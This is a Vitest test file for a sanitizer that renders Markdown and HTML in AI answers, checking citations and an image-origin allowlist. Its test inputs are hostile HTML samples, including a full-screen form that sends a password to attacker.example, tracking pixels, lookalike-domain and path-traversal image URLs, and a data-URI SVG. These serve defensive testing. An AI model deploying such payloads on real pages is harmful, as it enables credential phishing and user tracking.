import { describe, expect, it } from 'vitest';
import { sanitizeAndParse } from '../utils/helpers';

describe('sanitizeAndParse security boundary', () => {
  it('renders hostile raw HTML as inert text and blocks attacker-controlled image requests', () => {
    const output = sanitizeAndParse(`
<form action="https://attacker.example/collect" style="position:fixed;inset:0">
  <input name="password">
  <button type="submit">Continue</button>
</form>
<iframe src="https://attacker.example/frame"></iframe>
<svg><a href="https://attacker.example/svg">click</a></svg>
<img src="https://attacker.example/tracker.png" style="position:fixed">

![tracking pixel](https://attacker.example/markdown-pixel.png)
`);

    const rendered = document.createElement('div');
    rendered.innerHTML = output;

    expect(rendered.querySelector('form, input, button, iframe, svg, img')).toBeNull();
    expect(rendered.querySelector('[style]')).toBeNull();
    expect(rendered.textContent).toContain('<form');
    expect(rendered.textContent).toContain('<img');
  });

  it('preserves supported Markdown, safe links, citations, and approved AI images', () => {
    const output = sanitizeAndParse(`
**Bold** [OpenAI](https://openai.com/docs?q=chat)

| A | B |
| - | - |
| 1 | 2 |

\`\`\`ts
const answer = 42;
\`\`\`

[example.com](https://example.com/path_(nested))

https://windowsforum.com/images/ai/screenshots/example.webp

https://test.windowsforum.com/images/ai/answers/example.png
`);

    expect(output).toContain('<strong>Bold</strong>');
    expect(output).toContain('href="https://openai.com/docs?q=chat"');
    expect(output).toContain('<table>');
    expect(output).toContain('<code class="language-ts">');
    expect(output).toContain('Sources:');
    expect(output).toContain('href="https://example.com/path_(nested)"');
    expect(output).toContain('src="https://windowsforum.com/images/ai/screenshots/example.webp"');
    expect(output).toContain('src="https://test.windowsforum.com/images/ai/answers/example.png"');
  });

  it('extracts citations from Markdown tokens without rewriting code or duplicating sources', () => {
    const output = sanitizeAndParse(`
\`(not-a-source.example.com)\`

[example.com](https://example.com/path_(nested)) and [example.com](https://example.com/path_(nested)).

(docs.example.org/reference?q=chat)
`);
    const rendered = document.createElement('div');
    rendered.innerHTML = output;

    expect(rendered.querySelector('code')?.textContent).toBe('(not-a-source.example.com)');
    expect([...rendered.querySelectorAll('sup')].map(node => node.textContent)).toEqual(['[1]', '[1]', '[2]']);
    expect(rendered.querySelectorAll('a[href="https://example.com/path_(nested)"]')).toHaveLength(1);
    expect(rendered.querySelectorAll('a[href="https://docs.example.org/reference?q=chat"]')).toHaveLength(1);
  });

  it('allows image requests only to the exact approved origins and paths', () => {
    const output = sanitizeAndParse(`
![lookalike](https://windowsforum.com.attacker.example/images/ai/screenshots/pixel.png)
![insecure](http://windowsforum.com/images/ai/screenshots/pixel.png)
![traversal](https://windowsforum.com/images/ai/screenshots/../../pixel.png)
![data](data:image/svg+xml;base64,PHN2Zz4=)
![approved](https://windowsforum.com/images/ai/walkthroughs/step.jpg?v=2)
`);
    const rendered = document.createElement('div');
    rendered.innerHTML = output;
    const images = [...rendered.querySelectorAll('img')];

    expect(images).toHaveLength(1);
    expect(images[0].getAttribute('src')).toBe('https://windowsforum.com/images/ai/walkthroughs/step.jpg?v=2');
  });
});
